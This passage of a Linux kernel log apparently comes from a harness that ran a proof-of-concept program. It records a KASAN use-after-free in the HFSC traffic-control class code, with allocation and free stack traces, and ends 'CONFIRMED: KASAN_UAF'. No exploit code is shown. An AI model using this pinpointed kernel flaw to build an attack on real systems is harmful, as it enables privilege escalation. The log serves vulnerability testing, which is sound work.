[    5.555280] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043b8e3
[    5.557119] RDX: 0000000000000001 RSI: 0000000000491ad5 RDI: 0000000000000004
[    5.563324] RBP: 000000000001000a R08: 00007ffc4beae620 R09: 0000000000000010
[    5.564757] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000006050024
[    5.566201] R13: 0000000000010009 R14: 0000000000000001 R15: 0000000000000001
[    5.567690]  </TASK>
[    5.568181] 
[    5.581500] Allocated by task 62:
[    5.582047]  kasan_save_stack+0x33/0x60
[    5.582693]  kasan_set_track+0x25/0x30
[    5.583300]  __kasan_kmalloc+0x8f/0xa0
[    5.584016]  hfsc_change_class+0x54a/0x2e50
[    5.594194]  tc_ctl_tclass+0x3cf/0xf40
[    5.595356]  rtnetlink_rcv_msg+0x35d/0x9d0
[    5.598313]  netlink_rcv_skb+0x12f/0x370
[    5.599546]  netlink_unicast+0x588/0x7f0
[    5.600755]  netlink_sendmsg+0x7b7/0xc60
[    5.601396]  sock_write_iter+0x3e2/0x490
[    5.602018]  vfs_write+0x89d/0xcb0
[    5.604733]  ksys_write+0x177/0x1d0
[    5.605864]  do_syscall_64+0x3b/0x90
[    5.606989]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    5.611913] 
[    5.612441] Freed by task 62:
[    5.613403]  kasan_save_stack+0x33/0x60
[    5.614617]  kasan_set_track+0x25/0x30
[    5.615929]  kasan_save_free_info+0x2b/0x50
[    5.617206]  __kasan_slab_free+0x10a/0x180
[    5.618442]  __kmem_cache_free+0x82/0x1c0
[    5.625825]  hfsc_delete_class+0x44c/0x6f0
[    5.634564]  tc_ctl_tclass+0x9af/0xf40
[    5.635353]  rtnetlink_rcv_msg+0x35d/0x9d0
[    5.636310]  netlink_rcv_skb+0x12f/0x370
[    5.637154]  netlink_unicast+0x588/0x7f0
[    5.642253]  netlink_sendmsg+0x7b7/0xc60
[    5.642881]  sock_write_iter+0x3e2/0x490
[    5.643530]  vfs_write+0x89d/0xcb0
[    5.644117]  ksys_write+0x177/0x1d0
[    5.644685]  do_syscall_64+0x3b/0x90
[    5.645276]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    5.647786] 
[    5.648404] The buggy address belongs to the object at ffff888009fa0000
[    5.648404]  which belongs to the cache kmalloc-1k of size 1024
[    5.657616] The buggy address is located 200 bytes inside of
[    5.657616]  freed 1024-byte region [ffff888009fa0000, ffff888009fa0400)
[    5.663790] 
[    5.665483] The buggy address belongs to the physical page:
[    5.666878] page:000000009fc9b755 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9fa0
[    5.672428] head:000000009fc9b755 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    5.680582] flags: 0x100000000010200(slab|head|node=0|zone=1)
[    5.686743] page_type: 0xffffffff()
[    5.689490] raw: 0100000000010200 ffff888006441dc0 dead000000000122 0000000000000000
[    5.695478] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    5.699881] page dumped because: kasan: bad access detected
[    5.704095] 
[    5.704936] Memory state around the buggy address:
[    5.711434]  ffff888009f9ff80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    5.715741]  ffff888009fa0000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    5.728293] >ffff888009fa0080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    5.735606]                                               ^
[    5.743614]  ffff888009fa0100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    5.747164]  ffff888009fa0180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    5.749861] ==================================================================
[    5.753146] Disabling lock debugging due to kernel taint
[    5.759460] HFSC: netem qdisc 2: is non-work-conserving?
[    5.970630] poc (62) used greatest stack depth: 25584 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    6.058153] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    8.313606] ACPI: PM: Preparing to enter system sleep state S5
[    8.317689] reboot: Power down
CONFIRMED: KASAN_UAF
